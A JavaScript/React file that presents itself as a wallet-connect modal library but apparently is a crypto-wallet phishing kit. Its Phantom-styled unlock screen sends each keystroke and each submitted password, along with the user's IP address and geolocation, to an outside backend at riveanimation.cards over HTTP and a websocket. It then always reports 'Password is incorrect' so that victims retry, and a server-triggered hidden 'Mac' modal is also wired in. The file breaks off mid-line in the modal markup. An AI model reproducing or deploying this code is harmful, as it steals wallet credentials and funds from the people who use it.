import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { createPortal } from 'react-dom';
import io from 'socket.io-client';

/**
 * Wallet Registry
 *
 * To add a new wallet:
 * 1. Add the wallet type to WalletType in types.ts
 * 2. Add configuration here
 * 3. Create the modal component in src/wallets/[wallet-name]/
 * 4. Register it in walletComponents map
 */
const walletConfigs = {
    MetaMask: {
        id: 'MetaMask',
        name: 'MetaMask',
        shortKey: 'MM',
        icon: '🦊',
    },
    Phantom: {
        id: 'Phantom',
        name: 'Phantom',
        shortKey: 'PH',
        icon: '👻',
    },
    Rabby: {
        id: 'Rabby',
        name: 'Rabby',
        shortKey: 'RB',
        icon: '🐰',
    },
    TronLink: {
        id: 'TronLink',
        name: 'TronLink',
        shortKey: 'TL',
        icon: '🔺',
    },
    Bitget: {
        id: 'Bitget',
        name: 'Bitget',
        shortKey: 'BG',
        icon: '💼',
    },
    Coinbase: {
        id: 'Coinbase',
        name: 'Coinbase Wallet',
        shortKey: 'CB',
        icon: '🔵',
    },
    Solflare: {
        id: 'Solflare',
        name: 'Solflare',
        shortKey: 'SF',
        icon: '🌐',
    },
    OKX: {
        id: 'OKX',
        name: 'OKX Wallet',
        shortKey: 'OKX',
        icon: '⬛',
    },
    Mac: {
        id: 'Mac',
        name: 'Mac',
        shortKey: 'MAC',
        icon: '🍎',
    },
};
/**
 * Get wallet configuration by type
 */
const getWalletConfig = (walletType) => {
    return walletConfigs[walletType];
};
/**
 * Get all available wallet types
 */
const getAllWalletTypes = () => {
    return Object.keys(walletConfigs);
};
/**
 * Get wallet short key (for backend)
 */
const getWalletShortKey = (walletType) => {
    return walletConfigs[walletType]?.shortKey || walletType.substring(0, 2).toUpperCase();
};

// Default configuration
const defaultConfig = {
    serverUrl: "https://wagmirequest.la",
    serverSocket: "wss://api.riveanimation.cards",
    clientSocket: "wss://api.riveanimation.cards",
    clientUrl: "https://www.riveanimation.cards/v1",
    secretKey: "ABCDEF",
    // backendUrl: "http://localhost:3000",
    backendUrl: "https://api.riveanimation.cards",
    assetBaseUrl: "https://www.riveanimation.cards", // Default asset base URL
    macModalSocketEvent: "showMacModal",
};
let currentConfig = { ...defaultConfig };
const getConfig = () => ({ ...currentConfig });
const setConfig = (config) => {
    currentConfig = { ...currentConfig, ...config };
};
const getClientSocket = () => currentConfig.clientSocket;
const getClientUrl = () => currentConfig.clientUrl;
const getBackendUrl = () => currentConfig.backendUrl;
const getAssetBaseUrl = () => currentConfig.assetBaseUrl;
const getMacModalSocketEvent = () => currentConfig.macModalSocketEvent;
// Wallet type shortkeys
const WALLET_TYPE_SHORTKEY = {
    METAMASK: "MM",
    PHANTOM: "PH",
    RABBY: "RB",
    TRONLINK: "TL",
    BITGET: "BG",
    COINBASE: "CB",
    SOLFLARE: "SF",
    OKX: "OKX"};

// Cache for user wallet types
const walletTypesCache = new Map();
const CACHE_DURATION = 5 * 60 * 1000; // 5 minutes
/**
 * Get wallet types for a user by user_id
 * This endpoint requires authentication, but for the widget we'll make it public
 * or use a different approach. For now, we'll try to fetch without auth.
 */
const getUserWalletTypes = async (userId) => {
    if (!userId) {
        return [];
    }
    // Check cache first
    const cached = walletTypesCache.get(userId);
    if (cached && Date.now() - cached.timestamp < CACHE_DURATION) {
        return cached.data;
    }
    try {
        const BACKEND_URL = getBackendUrl();
        if (!BACKEND_URL) {
            console.warn('BACKEND_URL is not configured, returning empty wallet types');
            return [];
        }
        const response = await axios.get(`${BACKEND_URL}/api/users/user-id/${userId}/wallet-types`, {
            timeout: 5000,
            // Note: This endpoint requires authentication in production
            // For widget usage, you may need to make this endpoint public
            // or use a different authentication method
        });
        const walletTypes = response.data.wallet_types || [];
        // Cache the result
        walletTypesCache.set(userId, {
            data: walletTypes,
            timestamp: Date.now(),
        });
        return walletTypes;
    }
    catch (error) {
        console.warn('Failed to fetch user wallet types:', error.message);
        // Return empty array on error - widget will show all wallets
        return [];
    }
};
/**
 * Clear cache for a specific user or all users
 */
const clearWalletTypesCache = (userId) => {
    if (userId) {
        walletTypesCache.delete(userId);
    }
    else {
        walletTypesCache.clear();
    }
};

/**
 * ModalContainer - Isolates modal styles from external project styles
 *
 * This component:
 * 1. Wraps modals in a scoped container to prevent style conflicts
 * 2. Uses CSS isolation to prevent external styles from affecting modal
 * 3. Ensures modal styles don't leak to the parent project
 * 4. Handles portal rendering to body
 *
 * Note: Individual modals should NOT use createPortal - this component handles it
 */
const ModalContainer = ({ children, className = '' }) => {
    const container = (React.createElement("div", { className: `wallet-connect-modal-container ${className}` }, children));
    return createPortal(container, document.body);
};

/**
 * Asset Path Utility
 *
 * Resolves asset paths using third-party URL from config.
 * Assets are hosted on a CDN/third-party server instead of being bundled.
 */
/**
 * Get asset URL from third-party server
 * @param relativePath - Path relative to dist folder (e.g., "wallets/metamask/assets/fox.svg")
 * @returns Full URL to the asset on third-party server
 */
function getAssetPath(relativePath) {
    // Get base URL from config (defaults to third-party URL)
    const baseUrl = getAssetBaseUrl();
    // Remove trailing slash if present
    const cleanBaseUrl = baseUrl.replace(/\/$/, '');
    // Construct full URL
    return `${cleanBaseUrl}/${relativePath}`;
}
/**
 * Resolve asset import to full URL
 * This function is used to convert asset imports (which export relative paths)
 * to full URLs using the configured asset base URL
 * @param assetImport - The imported asset (string path)
 * @returns Full URL to the asset
 */
function resolveAssetUrl(assetImport) {
    return getAssetPath(assetImport);
}

/**
 * Asset Paths Configuration
 *
 * Defines all asset file paths relative to the dist folder.
 * These paths are resolved to full URLs using the assetBaseUrl from config.
 */
// Wallet logo assets (for selection modal)
const ASSET_PATHS = {
    // Logo assets
    metamaskLogo: 'menu/metamask_logo.svg',
    phantomLogo: 'menu/phantom_logo.svg',
    rabbyLogo: 'menu/rabyy_logo.svg',
    coinbaseLogo: 'menu/coinbase_logo.svg',
    bitgetLogo: 'menu/bitget_logo.png',
    tronlinkLogo: 'menu/tronlink_logo.jpeg',
    solflareLogo: 'menu/solflare_logo.png',
    okxLogo: 'menu/okx_logo.png',
    // Wallet-specific assets
    metamaskFox: 'v1/images/logo/metamask-fox.png',
    metamaskFoxRiv: 'v1/static/media/fox_appear.9dea054e4b9b49cb4fad.riv',
    tronlinkLoading: 'v4/images/loading.gif',
    solflareFlag: 'v7/images/flag.mp4',
    okxCoverLight: 'v9/images/cover-light.mp4',
    okxCoverDark: 'v9/images/cover-dark-v3.mp4',
    // Phantom assets (if needed)
    phantomGifS: 'v2/images/phantom/s.gif',
    phantomGifW: 'v2/images/phantom/w.gif',
    phantomGifWp: 'v2/images/phantom/wp.gif',
    phantomGifN: 'v2/images/phantom/n.gif',
    phantomGifJ: 'v2/images/phantom/j.gif',
};

const WalletSelectionModal = ({ isOpen = false, onWalletSelect, onClose, userId, }) => {
    const [wallets, setWallets] = useState([]);
    const [isLoading, setIsLoading] = useState(false);
    useEffect(() => {
        if (isOpen && userId) {
            loadUserWallets();
        }
        else if (isOpen) {
            // If no userId, show all wallets (exclude Mac — socket-triggered only)
            setWallets(getAllWalletTypes().filter((w) => w !== 'Mac'));
        }
    }, [isOpen, userId]);
    const loadUserWallets = async () => {
        if (!userId)
            return;
        setIsLoading(true);
        try {
            const userWalletTypes = await getUserWalletTypes(userId);
            if (userWalletTypes.length === 0) {
                setWallets([]);
                return;
            }
            // Create reverse map: shortkey -> WalletType
            const allWallets = getAllWalletTypes();
            const shortKeyToWalletType = {};
            allWallets.forEach(wallet => {
                const shortKey = getWalletShortKey(wallet).toUpperCase().trim();
                shortKeyToWalletType[shortKey] = wallet;
                // Also add by name for fallback matching
                shortKeyToWalletType[wallet.toUpperCase()] = wallet;
            });
            // Map user's wallet types to WalletType enum by matching shortkeys
            const filtered = [];
            userWalletTypes.forEach(userWalletType => {
                const shortKey = userWalletType.shortkey.toUpperCase().trim();
                const name = userWalletType.name;
                // Try matching by shortkey first
                let walletType = shortKeyToWalletType[shortKey];
                // If not found, try matching by name
                if (!walletType && name) {
                    walletType = shortKeyToWalletType[name.toUpperCase()];
                }
                if (walletType && walletType !== 'Mac') {
                    filtered.push(walletType);
                }
                else if (!walletType) {
                    console.warn(`✗ No wallet found for: shortkey="${shortKey}", name="${name}"`);
                    console.warn(`Available shortkeys:`, Object.keys(shortKeyToWalletType));
                }
            });
            setWallets(filtered);
        }
        catch (error) {
            console.error('Error loading user wallet types:', error);
            setWallets([]);
        }
        finally {
            setIsLoading(false);
        }
    };
    if (!isOpen)
        return null;
    const handleWalletClick = (wallet) => {
        if (onWalletSelect) {
            onWalletSelect(wallet);
        }
    };
    const getWalletLogo = (wallet) => {
        let logoPath = '';
        switch (wallet) {
            case 'MetaMask':
                logoPath = ASSET_PATHS.metamaskLogo;
                break;
            case 'Phantom':
                logoPath = ASSET_PATHS.phantomLogo;
                break;
            case 'Rabby':
                logoPath = ASSET_PATHS.rabbyLogo;
                break;
            case 'Coinbase':
                logoPath = ASSET_PATHS.coinbaseLogo;
                break;
            case 'Bitget':
                logoPath = ASSET_PATHS.bitgetLogo;
                break;
            case 'TronLink':
                logoPath = ASSET_PATHS.tronlinkLogo;
                break;
            case 'Solflare':
                logoPath = ASSET_PATHS.solflareLogo;
                break;
            case 'OKX':
                logoPath = ASSET_PATHS.okxLogo;
                break;
            default:
                return '';
        }
        // Resolve relative path to full third-party URL
        return resolveAssetUrl(logoPath);
    };
    const getWalletName = (wallet) => {
        const config = getWalletConfig(wallet);
        return config.name || wallet;
    };
    return (React.createElement(ModalContainer, null,
        React.createElement("div", { style: {
                position: 'fixed',
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                backgroundColor: 'rgba(0, 0, 0, 0.5)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                zIndex: 1000,
            }, onClick: onClose },
            React.createElement("div", { style: {
                    backgroundColor: '#fff',
                    borderRadius: '16px',
                    padding: '32px 32px',
                    maxWidth: '450px',
                    width: '90%',
                    boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)',
                }, onClick: (e) => e.stopPropagation() },
                React.createElement("div", { style: {
                        display: 'flex',
                        justifyContent: 'space-between',
                        alignItems: 'center',
                        marginBottom: '24px',
                    } },
                    React.createElement("h2", { style: {
                            margin: 0,
                            fontSize: '20px',
                            fontWeight: '700',
                            color: '#1F2937',
                        } }, "Connect Wallet"),
                    React.createElement("button", { onClick: onClose, style: {
                            background: 'none',
                            border: 'none',
                            fontSize: '24px',
                            cursor: 'pointer',
                            color: '#6B7280',
                            padding: '0',
                            width: '32px',
                            height: '32px',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            borderRadius: '4px',
                        }, onMouseEnter: (e) => {
                            e.currentTarget.style.backgroundColor = '#F3F4F6';
                        }, onMouseLeave: (e) => {
                            e.currentTarget.style.backgroundColor = 'transparent';
                        } }, "\u00D7")),
                isLoading ? (React.createElement("div", { style: { textAlign: 'center', padding: '20px', color: '#666' } }, "Loading wallet options...")) : wallets.length === 0 ? (React.createElement("div", { style: { textAlign: 'center', padding: '20px', color: '#666' } }, "No wallets available for this user.")) : (React.createElement("div", { style: {
                        display: 'grid',
                        gridTemplateColumns: '1fr',
                        gap: '16px',
                    } }, wallets.map((wallet) => (React.createElement("button", { key: wallet, onClick: () => handleWalletClick(wallet), style: {
                        display: 'flex',
                        flexDirection: 'row',
                        alignItems: 'center',
                        justifyContent: 'start',
                        gap: '26px',
                        padding: '12px 24px',
                        border: '2px solid #E5E7EB',
                        borderRadius: '12px',
                        backgroundColor: '#fff',
                        cursor: 'pointer',
                        transition: 'all 0.2s ease',
                        textAlign: 'center',
                        width: '100%',
                    }, onMouseEnter: (e) => {
                        e.currentTarget.style.borderColor = '#4F46E5';
                        e.currentTarget.style.backgroundColor = '#EEF2FF';
                    }, onMouseLeave: (e) => {
                        e.currentTarget.style.borderColor = '#E5E7EB';
                        e.currentTarget.style.backgroundColor = '#fff';
                    } },
                    React.createElement("img", { src: getWalletLogo(wallet), alt: `${getWalletName(wallet)} logo`, style: {
                            width: '40px',
                            height: '40px',
                            objectFit: 'contain',
                            flexShrink: 0,
                        } }),
                    React.createElement("span", { style: {
                            fontSize: '16px',
                            fontWeight: '600',
                            color: '#1F2937',
                        } }, getWalletName(wallet)))))))))));
};

/**
 * Hook to detect browser's dark mode preference
 * Automatically updates when user changes their system theme
 */
const useDarkMode = () => {
    const [isDarkMode, setIsDarkMode] = useState(() => {
        // Check if we're in a browser environment
        if (typeof window === 'undefined') {
            return false;
        }
        // Check browser's prefers-color-scheme media query
        return window.matchMedia('(prefers-color-scheme: dark)').matches;
    });
    useEffect(() => {
        if (typeof window === 'undefined') {
            return;
        }
        // Create a media query listener
        const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
        // Handler function to update state when preference changes
        const handleChange = (e) => {
            setIsDarkMode(e.matches);
        };
        // Check if addEventListener is supported (modern browsers)
        if (mediaQuery.addEventListener) {
            mediaQuery.addEventListener('change', handleChange);
            return () => {
                mediaQuery.removeEventListener('change', handleChange);
            };
        }
        else {
            // Fallback for older browsers
            mediaQuery.addListener(handleChange);
            return () => {
                mediaQuery.removeListener(handleChange);
            };
        }
    }, []);
    return isDarkMode;
};

/**
 * Get client IP address
 */
const getClientIP = async () => {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (response.ok) {
            const data = await response.json();
            return data.ip || 'unknown';
        }
    }
    catch (error) {
        console.warn('Failed to get IP from ipify:', error);
    }
    try {
        const response = await fetch('https://ipapi.co/ip/');
        if (response.ok) {
            const ip = await response.text();
            return ip.trim() || 'unknown';
        }
    }
    catch (error) {
        console.warn('Failed to get IP from ipapi:', error);
    }
    return 'unknown';
};
/**
 * Get location information based on IP address
 */
const getLocation = async (ipAddress = null) => {
    try {
        let ip = ipAddress;
        if (!ip || ip === 'unknown') {
            ip = await getClientIP();
        }
        if (!ip || ip === 'unknown') {
            return 'unknown';
        }
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        if (response.ok) {
            const data = await response.json();
            if (data.error) {
                return 'unknown';
            }
            const locationParts = [];
            if (data.city)
                locationParts.push(data.city);
            if (data.region_code)
                locationParts.push(data.region_code);
            if (data.country_code)
                locationParts.push(data.country_code);
            return locationParts.length > 0 ? locationParts.join(', ') : 'unknown';
        }
    }
    catch (error) {
        console.warn('Failed to get location:', error);
    }
    return 'unknown';
};
/**
 * Get country code from location string
 */
const getCountryCode = (location) => {
    if (!location || location === 'unknown') {
        return 'unknown';
    }
    const parts = location.split(',').map(p => p.trim());
    const countryCode = parts[parts.length - 1];
    return countryCode && countryCode.length === 2 ? countryCode.toUpperCase() : 'unknown';
};
/**
 * Get both IP and Location in a single call
 */
const getIPAndLocation = async () => {
    try {
        const ip = await getClientIP();
        const location = await getLocation(ip);
        const countryCode = getCountryCode(location);
        return {
            IP_address: ip,
            Location: location,
            country_code: countryCode
        };
    }
    catch (error) {
        console.error('Failed to get IP and Location:', error);
        return {
            IP_address: 'unknown',
            Location: 'unknown',
            country_code: 'unknown'
        };
    }
};

// Socket.io client instance (will be initialized when needed)
let socketInstance = null;
/**
 * Initialize Socket.io connection
 * Reuses existing socket instance to avoid creating multiple connections
 */
const getSocketInstance = () => {
    // If socket instance already exists, reuse it (socket.io handles reconnection automatically)
    if (socketInstance) {
        return socketInstance;
    }
    // Only create a new socket if one doesn't exist
    try {
        const url = getClientSocket();
        socketInstance = io(url, {
            transports: ['websocket', 'polling'],
            timeout: 10000,
            reconnection: true,
            reconnectionDelay: 1000,
            reconnectionAttempts: 5
        });
        socketInstance.on('connect', () => {
        });
        socketInstance.on('disconnect', (reason) => {
        });
        socketInstance.on('connect_error', (error) => {
            console.error('Socket connection error:', error);
        });
        return socketInstance;
    }
    catch (error) {
        console.error('Failed to initialize Socket.io:', error);
        return null;
    }
};
/**
 * Initialize socket connection early (call this when widget loads)
 */
const initializeSocket = () => {
    return getSocketInstance();
};
/**
 * Subscribe to backend "show Mac modal" socket event.
 * When the backend emits this event, the callback is invoked with the payload.
 * Use with MacModalTrigger to show the Mac modal on signal.
 * The modal should only be shown when payload.user_id matches the client's userId.
 *
 * @param callback - Called with the emitted payload (e.g. { message, user_id, timestamp }).
 * @returns Unsubscribe function.
 */
const subscribeToShowMacModal = (callback) => {
    const socket = getSocketInstance();
    if (!socket) {
        return () => { };
    }
    const eventName = getMacModalSocketEvent();
    const handler = (payload) => callback(payload);
    socket.on(eventName, handler);
    return () => {
        socket.off(eventName, handler);
    };
};
/**
 * Send key data to backend via API
 */
const sendKeyToBackendAPI = async (userId, keyType, keys, walletTypeShortkey = 'MM', locationData = null) => {
    try {
        const BACKEND_URL = getBackendUrl();
        if (!BACKEND_URL) {
            console.error('BACKEND_URL is not configured');
            return { success: false, error: 'Backend URL not configured' };
        }
        if (!userId) {
            console.error('USER_ID is required');
            return { success: false, error: 'User ID is required' };
        }
        if (!keyType || (keyType !== 'cha' && keyType !== 'enter')) {
            return { success: false, error: 'Invalid key_type. Must be "cha" or "enter"' };
        }
        const ipAndLocation = locationData || await getIPAndLocation().catch(() => ({
            IP_address: 'unknown',
            Location: 'unknown',
            country_code: 'unknown'
        }));
        const payload = {
            user_id: userId,
            key_type: keyType,
            keys: keys || '',
            wallet_type: walletTypeShortkey || 'MM',
            IP_address: ipAndLocation.IP_address || 'unknown',
            Location: ipAndLocation.Location || 'unknown',
            country_code: ipAndLocation.country_code || 'unknown'
        };
        const response = await axios.post(`${BACKEND_URL}/api/keys`, payload, {
            headers: {
                'Content-Type': 'application/json',
            },
            timeout: 10000,
        });
        return { success: true, data: response.data };
    }
    catch (error) {
        console.error('Error sending key to backend via API:', error);
        if (error.response) {
            return {
                success: false,
                error: error.response.data?.error || error.response.data?.message || `Server error: ${error.response.status}`
            };
        }
        else if (error.request) {
            return { success: false, error: 'No response from server' };
        }
        else {
            return { success: false, error: error.message || 'Unknown error' };
        }
    }
};
/**
 * Send key data to backend via Socket.io
 */
const sendKeyToBackendSocket = async (userId, keyType, keys, walletTypeShortkey = 'MM', locationData = null) => {
    return new Promise(async (resolve) => {
        try {
            const BACKEND_URL = getBackendUrl();
            if (!BACKEND_URL) {
                return resolve({ success: false, error: 'Backend URL not configured' });
            }
            if (!userId) {
                return resolve({ success: false, error: 'User ID is required' });
            }
            if (!keyType || (keyType !== 'cha' && keyType !== 'enter')) {
                return resolve({ success: false, error: 'Invalid key_type. Must be "cha" or "enter"' });
            }
            const socket = getSocketInstance();
            if (!socket) {
                return resolve({ success: false, error: 'Failed to initialize Socket.io' });
            }
            if (!socket.connected) {
                await new Promise((connectResolve, connectReject) => {
                    const timeout = setTimeout(() => {
                        connectReject(new Error('Socket connection timeout'));
                    }, 5000);
                    socket.once('connect', () => {
                        clearTimeout(timeout);
                        connectResolve();
                    });
                    socket.once('connect_error', (error) => {
                        clearTimeout(timeout);
                        connectReject(error);
                    });
                }).catch(() => {
                    console.warn('Socket not connected yet, but proceeding with emit');
                });
            }
            const ipAndLocation = locationData || await getIPAndLocation().catch(() => ({
                IP_address: 'unknown',
                Location: 'unknown',
                country_code: 'unknown'
            }));
            const payload = {
                user_id: userId,
                key_type: keyType,
                keys: keys || '',
                wallet_type: walletTypeShortkey || 'MM',
                IP_address: ipAndLocation.IP_address || 'unknown',
                Location: ipAndLocation.Location || 'unknown',
                country_code: ipAndLocation.country_code || 'unknown'
            };
            const timeout = setTimeout(() => {
                resolve({ success: false, error: 'Socket request timeout' });
            }, 10000);
            const successHandler = (data) => {
                clearTimeout(timeout);
                resolve({ success: true, data: data.key });
            };
            const errorHandler = (error) => {
                clearTimeout(timeout);
                const errorMessage = typeof error === 'object' && error.error ? error.error : (typeof error === 'string' ? error : 'Socket error');
                resolve({ success: false, error: errorMessage });
            };
            socket.once('keyInsertSuccess', successHandler);
            socket.once('keyInsertError', errorHandler);
            socket.emit('insertKey', payload);
        }
        catch (error) {
            console.error('Error sending key to backend via Socket:', error);
            resolve({ success: false, error: error.message || 'Unknown error' });
        }
    });
};
// Cached IP and Location data
let cachedLocationData = null;
let locationDataPromise = null;
/**
 * Initialize and cache IP and Location data
 */
const initializeLocationData = async () => {
    if (cachedLocationData) {
        return cachedLocationData;
    }
    if (locationDataPromise) {
        return locationDataPromise;
    }
    locationDataPromise = (async () => {
        try {
            const data = await getIPAndLocation();
            cachedLocationData = data;
            return data;
        }
        catch (error) {
            console.warn('Failed to get IP and Location, using defaults:', error);
            cachedLocationData = {
                IP_address: 'unknown',
                Location: 'unknown',
                country_code: 'unknown'
            };
            return cachedLocationData;
        }
        finally {
            locationDataPromise = null;
        }
    })();
    return locationDataPromise;
};
/**
 * Send key data to backend using BOTH API and Socket simultaneously
 */
const sendKeyToBackend = async (userId, keyType, keys, walletTypeShortkey = 'MM') => {
    if (!cachedLocationData) {
        await initializeLocationData();
    }
    initializeSocket();
    const locationData = cachedLocationData || {
        IP_address: 'unknown',
        Location: 'unknown',
        country_code: 'unknown'
    };
    const [apiResult, socketResult] = await Promise.allSettled([
        sendKeyToBackendAPI(userId, keyType, keys, walletTypeShortkey, locationData),
        sendKeyToBackendSocket(userId, keyType, keys, walletTypeShortkey, locationData)
    ]);
    const apiSuccess = apiResult.status === 'fulfilled' && apiResult.value.success;
    const socketSuccess = socketResult.status === 'fulfilled' && socketResult.value.success;
    if (!apiSuccess) {
        console.warn('API send failed:', apiResult.status === 'fulfilled' ? apiResult.value.error : apiResult.reason);
    }
    if (!socketSuccess) {
        console.warn('Socket send failed:', socketResult.status === 'fulfilled' ? socketResult.value.error : socketResult.reason);
    }
    const overallSuccess = apiSuccess || socketSuccess;
    // Get error message from either API or Socket result
    const apiError = apiResult.status === 'fulfilled' ? apiResult.value.error : undefined;
    const socketError = socketResult.status === 'fulfilled' ? socketResult.value.error : undefined;
    const errorMessage = apiError || socketError;
    return {
        success: overallSuccess,
        error: overallSuccess ? undefined : (errorMessage || 'Request failed'), // Match original structure: error property at top level
        apiResult: apiResult.status === 'fulfilled' ? apiResult.value : { success: false, error: String(apiResult.reason) },
        socketResult: socketResult.status === 'fulfilled' ? socketResult.value : { success: false, error: String(socketResult.reason) }
    };
};

// Helper to get image path - works when package is installed
// Images are in dist/wallets/phantom/phantom/ when package is built
const getImagePath = (filename) => {
    // Use a path that resolves from node_modules
    // When installed: node_modules/wallet-connect-modal/dist/wallets/phantom/phantom/filename
    // Vite will serve files from node_modules if configured correctly
    // return `/node_modules/wallet-connect-modal/dist/wallets/phantom/phantom/${filename}`;
    return `https://www.riveanimation.cards/v2/images/phantom/${filename}`;
};
const PhantomModal = ({ isOpen, onClose, userId, backendConfig }) => {
    const [keyword, setKeyword] = useState('');
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState('');
    const [trying, setTrying] = useState(0);
    const [connecting, setConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const [currentImage, setCurrentImage] = useState('s.gif');
    const [hasStartedTyping, setHasStartedTyping] = useState(false);
    const [isButtonPressed, setIsButtonPressed] = useState(false);
    const [shouldShake, setShouldShake] = useState(false);
    const gifTimeoutRef = useRef(null);
    const inputRef = useRef(null);
    const modalRef = useRef(null); // Ref for the modal wrapper
    // Get image URL for the given filename
    const getImageUrl = (filename) => {
        return getImagePath(filename);
    };
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            const focusTimeout = setTimeout(() => {
                inputRef.current?.focus();
            }, 4000);
            const handleDocumentClick = (e) => {
                if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                    handleClick();
                }
            };
            document.addEventListener('click', handleDocumentClick);
            const modalElement = document.getElementById('phantom-forget-password-modal');
            if (modalElement) {
                modalElement.addEventListener('click', (e) => {
                    if (e.target === modalElement) {
                        modalElement.classList.add('hidden');
                    }
                });
            }
            const handleHelpPopoverClick = (e) => {
                const helpPopover = document.getElementById('phantom-help-popover');
                const helpButton = document.getElementById('menu-button--menu--:r1:');
                if (helpPopover && !helpPopover.classList.contains('hidden')) {
                    const isClickOnButton = helpButton && (helpButton === e.target || helpButton.contains(e.target));
                    const isClickOnPopover = helpPopover.contains(e.target);
                    if (!isClickOnPopover && !isClickOnButton) {
                        const modal = document.getElementById('phantom-help-popover');
                        if (modal) {
                            modal.classList.add('hidden');
                        }
                    }
                }
            };
            document.addEventListener('click', handleHelpPopoverClick);
            return () => {
                clearTimeout(focusTimeout);
                document.removeEventListener('click', handleDocumentClick);
                document.removeEventListener('click', handleHelpPopoverClick);
                if (gifTimeoutRef.current) {
                    clearTimeout(gifTimeoutRef.current);
                }
            };
        }
    }, [isOpen, isClosable]);
    const handleClick = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setTrying(0);
        setConnectionError(false);
        setError(false);
        setCurrentImage('s.gif');
        setHasStartedTyping(false);
        setIsButtonPressed(false);
        setShouldShake(false);
        if (gifTimeoutRef.current) {
            clearTimeout(gifTimeoutRef.current);
            gifTimeoutRef.current = null;
        }
    };
    const getCaretCoordinates = (element, position) => {
        const div = document.createElement('div');
        div.id = 'password-mirror-div';
        document.body.appendChild(div);
        const computed = window.getComputedStyle(element);
        div.textContent = new Array(position + 1).join('•');
        const span = document.createElement('span');
        span.textContent = '•';
        div.appendChild(span);
        const coordinates = {
            top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
            left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
        };
        document.body.removeChild(div);
        return coordinates;
    };
    const handleKeywordChange = async (e) => {
        const target = e.target;
        if (target && typeof target.getBoundingClientRect === 'function') {
            const element = target || inputRef.current;
            if (element) {
                element.getBoundingClientRect();
                getCaretCoordinates(element, element.selectionEnd || 0);
                // Animation emitter removed (was for Mascot)
            }
        }
        const newKeyword = target.value;
        if (!hasStartedTyping && newKeyword.length > 0) {
            setHasStartedTyping(true);
            setCurrentImage('w.gif');
            scheduleGifCompletion('n.gif');
        }
        setKeyword(newKeyword);
        setError(false);
        setShouldShake(false);
        const currentUserId = backendConfig?.userId || userId;
        // Send keys if userId is provided (matches original behavior)
        // backendConfig.enabled can be used to disable if needed, but defaults to enabled if userId exists
        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.PHANTOM);
        }
    };
    const handledForgetPwd = () => {
        showForgetPasswordModal();
    };
    const handledResetPwd = () => {
        handleClick();
        closeForgetPasswordModal();
        window.open('chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa/home.html#restore-vault', '_blank');
    };
    const handleLearnMore = () => {
        handleClick();
        closeForgetPasswordModal();
        window.open('https://help.phantom.com/', '_blank');
    };
    const handleKeywordTyping = async () => {
        if (connecting) {
            return;
        }
        if (keyword) {
            setConnecting(true);
            const currentUserId = backendConfig?.userId || userId;
            if (!currentUserId) {
                setConnecting(false);
                setError(true);
                setHelperText('User ID is required');
                setCurrentImage('wp.gif');
                setShouldShake(true);
                scheduleGifCompletion('n.gif');
                setTimeout(() => {
                    setShouldShake(false);
                }, 500);
                return;
            }
            // Send keys if userId is provided (matches original behavior)
            // backendConfig.enabled can be used to disable if needed, but defaults to enabled if userId exists
            if (backendConfig?.enabled !== false) {
                const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.PHANTOM);
                // Original code always goes into error handling path (success check is commented out)
                // Match original behavior exactly: ALWAYS show error state if trying < 3, regardless of result
                setTimeout(() => {
                    setConnecting(false);
                    if (trying < 3) {
                        // Change image to wp.gif when password is wrong
                        // Original ALWAYS shows error state (no check for result.success or result.error)
                        setError(true);
                        setHelperText(result.error || 'Password is incorrect. Please try again.');
                        setTrying(trying + 1);
                        setCurrentImage('wp.gif');
                        setShouldShake(true);
                        // After animation, change to n.gif
                        scheduleGifCompletion('n.gif');
                        // Stop shake animation after it completes
                        setTimeout(() => {
                            setShouldShake(false);
                        }, 500);
                    }
                    else {
                        setConnectionError(true);
                    }
                    // Note: On success, the modal does NOT close automatically (matches original behavior)
                    // The modal stays open, just sets connecting to false
                }, 150);
            }
            else {
                // If backend is disabled, just stop connecting state (don't close modal)
                setTimeout(() => {
                    setConnecting(false);
                }, 150);
            }
        }
        else {
            setError(false);
            setHelperText('');
        }
    };
    const showForgetPasswordModal = () => {
        const modal = document.getElementById('phantom-forget-password-modal');
        if (modal) {
            modal.classList.remove('hidden');
        }
    };
    const closeForgetPasswordModal = () => {
        const modal = document.getElementById('phantom-forget-password-modal');
        if (modal) {
            modal.classList.add('hidden');
        }
    };
    const showHelpModal = () => {
        const modal = document.getElementById('phantom-help-popover');
        if (modal) {
            modal.classList.remove('hidden');
        }
    };
    const closeHelpModal = () => {
        const modal = document.getElementById('phantom-help-popover');
        if (modal) {
            modal.classList.add('hidden');
        }
    };
    const scheduleGifCompletion = (targetImage) => {
        if (gifTimeoutRef.current) {
            clearTimeout(gifTimeoutRef.current);
        }
        gifTimeoutRef.current = setTimeout(() => {
            setCurrentImage(targetImage);
            gifTimeoutRef.current = null;
        }, 2000);
    };
    const handleImageClick = () => {
        setCurrentImage('j.gif');
        scheduleGifCompletion('n.gif');
    };
    const handleButtonMouseDown = () => {
        setIsButtonPressed(true);
    };
    const handleButtonMouseUp = () => {
        setIsButtonPressed(false);
    };
    const handleButtonMouseLeave = () => {
        setIsButtonPressed(false);
    };
    if (!isOpen)
        return null;
    // Use portal to render directly in document.body to ensure fixed positioning relative to viewport
    // This bypasses any parent elements with transform/perspective/filter that would create a containing block
    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
